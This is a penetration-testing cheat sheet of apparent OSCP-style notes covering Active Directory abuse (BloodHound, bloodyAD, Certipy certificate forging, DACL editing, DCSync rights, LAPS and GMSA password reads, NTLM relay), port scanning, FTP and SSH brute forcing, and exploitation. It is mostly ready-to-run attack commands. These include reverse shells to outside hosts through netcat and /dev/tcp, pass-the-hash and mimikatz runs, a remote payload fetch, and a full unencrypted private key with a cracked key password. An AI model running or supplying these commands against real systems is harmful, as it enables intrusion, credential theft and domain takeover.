## ADCSTemplate

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > ADCSTemplate`

```
Import-Module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
```


## BloodHound

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > BloodHound`

```
sudo apt-get install bloodhound
sudo bloodhound-setup
```

> [http://localhost:7474/browser/](http://localhost:7474/browser/)

```
sudo vi /etc/bhapi/bhapi.json
```
```
{
  "database": {
    "addr": "localhost:5432",
    "username": "_bloodhound",
    "secret": "bloodhound",
    "database": "bloodhound"
  },
  "neo4j": {
    "addr": "localhost:7687",
    "username": "neo4j",
    "secret": "neo4j"
  },
  "default_admin": {
    "principal_name": "admin",
    "password": "admin",
    "first_name": "Bloodhound",
    "last_name": "Kali"
  }
}
```
```
sudo bloodhound
```

> [http://127.0.0.1:8080/](http://127.0.0.1:8080/)

| Email Address | Password |
| --- | --- |
| admin | admin |


## BloodHound-Legacy

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > BloodHound-Legacy`

```
sudo apt-get install openjdk-11-jdk
pip install bloodhound
sudo apt-get install neo4j
sudo apt-get install bloodhound
```
```
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install apt-transport-https
sudo apt-get install neo4j
systemctl start neo4j
./bloodhound --no-sandbox
```

> [http://localhost:7474/browser/](http://localhost:7474/browser/)


## Docker Container

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > BloodHound-Legacy > Docker Container`

```
docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/<PASSWORD> -v $(pwd)/neo4j:/data neo4j:4.4-community
```

> [http://localhost:7474/browser/](http://localhost:7474/browser/)

```
ALTER USER neo4j SET PASSWORD '<PASSWORD>'
```


## BloodHound Python

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > BloodHound Python`

```
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' -c all --zip --dns-timeout 30
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
```


## bloodyAD

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > bloodyAD`

> [https://github.com/CravateRouge/bloodyAD/wiki/User-Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)

> [https://github.com/CravateRouge/bloodyAD/wiki/Access-Control](https://github.com/CravateRouge/bloodyAD/wiki/Access-Control)

```
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user                       // Get all users of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer                   // Get all computers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type container                  // Get all containers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump                                                              // Get AD DNS records
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member                                           // Get group members
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version        // Get AD functional level
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength                 // Get minimum password length policy
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota    // Read quota for adding computer objects to domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl                        // Get UserAccountControl flags
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                         // Read LAPS password
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                  // Read GMSA account password
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                           // Read GMSA account password using Kerberos
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST>        // Set a password for a user
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                             // Set a Service Principal Name (SPN)
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                      // Set a Service Principal Name (SPN) using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                 // Set a Service Principal Name (SPN) using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -k set object '<USERNAME>' altSecurityIdentities -v 'X509:<UPN=<USERNAME>@<DOMAIN>>/CN=<CN>'    // Set a email address within a certificate
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                   // Add user to a group
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                            // Add user to a group using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'                   // Add a computer object on behalf of a user
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                           // Add a new DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<USERNAME>' DONT_REQ_PREAUTH                                    // Enable DONT_REQ_PREAUTH for ASREPRoast
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f DONT_REQ_PREAUTH                                          // Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'    // Add genericAll permissions to a specific OU
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>                                        // Remove a DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac '<USERNAME>' ACCOUNTDISABLE                                   // Disable ACCOUNTDISABLE (enable account)
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -f ACCOUNTDISABLE                                         // Disable ACCOUNTDISABLE (enable account) using Kerberos
```


## Certipy

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Certipy`

> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

> [https://github.com/ly4k/BloodHound/](https://github.com/ly4k/BloodHound/)

```
certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <RHOST>
certipy-ad find -u '<USERNAME>' -p '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
```


## Account Creation

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Certipy > Account Creation`

```
certipy-ad account create -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -dns <RHOST> -user '<COMPUTERNAME>'
```


## Authentication

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Certipy > Authentication`

```
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>'
```


## LDAP-Shell

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Certipy > Authentication > LDAP-Shell`

```
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>' -ldap-shell
```
```
# add_user <USERNAME>
# add_user_to_group <GROUP>
```


## Certificate Forging

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Certipy > Certificate Forging`

```
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -template '<TEMPLATE>' -save-old
```


## Certificate Request

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Certipy > Certificate Request`

Run the following command twice because of a current issue with `certipy`.

```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>'
```
```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>' -debug
```


## Revert Changes

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Certipy > Revert Changes`

```
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -configuration <TEMPLATE>.json
```
```
./BloodHound --disable-gpu-sandbox
```


## dacledit.py

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > dacledit.py`

> [https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py](https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py)

```
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'write' -rights 'FullControl' -principal '<USERNAME>' -target-dn 'CN=<GROUP{>,CN=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <RHOST>
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'OU=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -use-ldaps -dc-ip <RHOST>
```
```
#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```

Then put the `msada_guids.py` into the same directory as `dacledit.py`

> [https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada\_guids.py](https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py)


## writeDACL

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > writeDACL`

> [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)

```
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```


## Recon Enum GenericWrite permissions on computer objects

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Enum GenericWrite permissions on computer objects`

```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' } | select Identity, AceType, ObjectDN
```


## Recon Get GPOs

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Get GPOs`

```
Get-NetGPO | select displayname, gpcfilesyspath
```


## SharpHound PowerShell

> Source: `01101100-C0D3X-00110110.md` → `BloodHound > SharpHound PowerShell`

```
Invoke-BloodHound -collectionmethod all -domain <domain> -OutputDirectory (Get-Location) -SearchForest
```


## bloodhound-python

> Source: `01101100-C0D3X-00110110.md` → `BloodHound > bloodhound-python`

```
bloodhound-python -u <username> -p '<password>' -ns <NS_IP> -d <domain> -c all
```


## bloodhound-python with proxychains

> Source: `01101100-C0D3X-00110110.md` → `BloodHound > bloodhound-python with proxychains`

```
proxychains bloodhound-python --zip -k -no-pass -u '<USERNAME>' -d <DOMAIN>  -c all -dc <DC-HOSTNAME> -ns <DNS_IP> --dns-tcp --dns-timeout 20
```


## bloodhound-python with proxychains & dnschief

> Source: `01101100-C0D3X-00110110.md` → `BloodHound > bloodhound-python with proxychains & dnschief`

```
python3 dnschef.py --fakeip <DC_IP> --fakedomains <domain>
proxychains bloodhound-python --zip -k -no-pass -u '<USERNAME>' -d <DOMAIN>  -c all -dc <DC-HOSTNAME> -ns 127.0.0.1
```


## ntlmrelayx Ldap

> Source: `01101100-C0D3X-00110110.md` → `ntlmrelayx > ntlmrelayx Ldap`

```
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://<target> -l /save/loot
```


## read LAPS

> Source: `01101100-C0D3X-00110110.md` → `Netexec > read LAPS`

```
nxc ldap <dc_ip> -d <domain> -u <username> -p '<password>' --module laps
```

```bash
# use the latest release, NXC is now a binary packaged will all its dependencies
root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/nxc-ubuntu-latest.zip

# execute nxc (smb, winrm, mssql, ...)
nxc rdp targets.txt -u users.txt -p pass.txt --ufail-limit 3 --gfail-limit 10 --continue-on-success
root@payload$ nxc smb -L
root@payload$ nxc smb -M name_module -o VAR=DATA
root@payload$ nxc smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
root@payload$ nxc smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
root@payload$ nxc smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
root@payload$ nxc smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
root@payload$ nxc smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
root@payload$ nxc smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
root@payload$ nxc smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
root@payload$ nxc smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
root@payload$ nxc mimikatz --server http --server-port 80
```


## LAPSToolkit command

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command`

```
Get-LAPSComputers
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

---

```
https://github.com/0xsyr0/oscp
```


## Network Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Network Enumeration`

```
ping $IP #63 ttl = linux #127 ttl = windows
```

```
nmap -p- --min-rate 1000 $IP
nmap -p- --min-rate 1000 $IP -Pn #disables the ping command and only scans ports
```

```
nmap -p <ports> -sV -sC -A $IP
```


## Stealth Scan

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Stealth Scan`

```
nmap -sS -p- --min-rate=1000 10.11.1.229 -Pn #stealth scans
```


## UDP Scan

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > UDP Scan`

```
sudo nmap -F -sU -sV $IP
```

```
#!/bin/bash

target="$1"
ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

echo "Running second nmap scan with open ports: $ports"

nmap -p "$ports" -sC -sV -A "$target"
```


## Autorecon

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Autorecon`

```
autorecon 192.168.238.156 --nmap-append="--min-rate=2500" --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 -vv
```


## Emumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Emumeration`

```
ftp -A $IP
ftp $IP
anonymous:anonymous
put test.txt #check if it is reflected in a http port
```


## Upload binaries

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Emumeration > Upload binaries`

```
ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe
```


## Brute Force

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Brute Force`

```
hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
```

```
wget -r ftp://steph:billabong@10.1.1.68/
wget -r ftp://anonymous:anonymous@192.168.204.157/
```

```
find / -name Settings.*  2>/dev/null #looking through the files
```


## Exiftool

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Exiftool`

```
ls
BROCHURE-TEMPLATE.pdf  CALENDAR-TEMPLATE.pdf  FUNCTION-TEMPLATE.pdf  NEWSLETTER-TEMPLATE.pdf  REPORT-TEMPLATE.pdf
```

```
exiftool *                                             

======== FUNCTION-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : FUNCTION-TEMPLATE.pdf
Directory                       : .
File Size                       : 337 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:28-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:43-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Cassie
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:38:02+02:00
Modify Date                     : 2022:11:02 11:38:02+02:00
Producer                        : Microsoft® Word 2016
======== NEWSLETTER-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : NEWSLETTER-TEMPLATE.pdf
Directory                       : .
File Size                       : 739 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:37-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:44-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Mark
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:11:56+02:00
Modify Date                     : 2022:11:02 11:11:56+02:00
Producer                        : Microsoft® Word 2016
======== REPORT-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : REPORT-TEMPLATE.pdf
Directory                       : .
File Size                       : 889 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:49-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:45-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Robert
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:08:26+02:00
Modify Date                     : 2022:11:02 11:08:26+02:00
Producer                        : Microsoft® Word 2016
    5 image files read
```


## putty tools

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > putty tools`

```
sudo apt upgrade && sudo apt install putty-tools
```


## puttygen

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > puttygen`

```
cat keeper.txt          
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

```
puttygen keeper.txt -O private-openssh -o id_rsa
```

```
chmod 600 id_rsa
```

```
ssh root@10.10.11.227 -i id_rsa
```


## Exploitation

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Exploitation`

-  COPY **RAW** - if you copy GitHub use RAW or Download)


## FreeSWITCH

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > FreeSWITCH`

- CVE-2019-19492
	- https://github.com/tucommenceapousser/CVE-2019-19492/blob/main/exploit.py
```bash
python3 freeswitch.py --target 192.168.106.151
```


## Active JDWP Service

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > FreeSWITCH > Active JDWP Service`

- https://github.com/IOActive/jdwp-shellifier
- We have to trigger the exploit by connecting to port 5000 locally on Berlin
	- We need to research to find this. The same github with exploit has a mass scan that includes ports `3999,5000,5005,8000,8453,8787-8788,9001,18000`
```bash
# ssh-keygen on Kali, move .pub to RHOST
ssh-keygen

# Setup port forward on Kali
ssh -i id_rsa -N -L 8000:127.0.0.1:8000 dev@192.168.106.150

# Run from Kali
python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.165 8889 -e bash"
// OR
python jdwp-shellifier.py -t my.target.ip -p 1234

# Start listner on Kali
rlwrap -cAr nc -lnvp 8889

# Trigger Exploit from RHOST! Possible ports 3999,5000,5005,8000,8453,8787-8788,9001,18000
nc -nv 127.0.0.1 5000
```


```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa USERB@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'

nc -nvlp 443
```

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
 -oHostKeyAlgorithms=+ssh-rsa\
 -oCiphers=+aes256-cbc\
 admin@10.11.1.252 -p 22000
```


## Brute Force

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Brute Force`

```
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
hydra -L users.txt -p WallAskCharacter305 192.168.153.139 -t 4 ssh -s 42022
```

```
chmod 600 id_rsa
ssh userb@172.16.138.14 -i id_rsa
```

```
cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ecPFmSXxVEK8oO3qu2pxa/e4izXBFc= USERZ@example #new user found
```

```
ssh2john id_ecdsa > id_ecdsa.hash

cat id_ecdsa.hash 
id_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash

fireball         (id_ecdsa)
```

```
/etc/ssh/*pub #Use this to view the type of key you have aka (ecdsa)

ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01
```

```
/home/userE/.ssh/id_ecdsa.pub #public key
/home/userE/.ssh/id_ecdsa #private key
```


## Errors

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Errors`

this means no password! Use it to login as a user on the box

```
ssh2john id_rsa > id_rsa.hash             
id_rsa has no password!
```

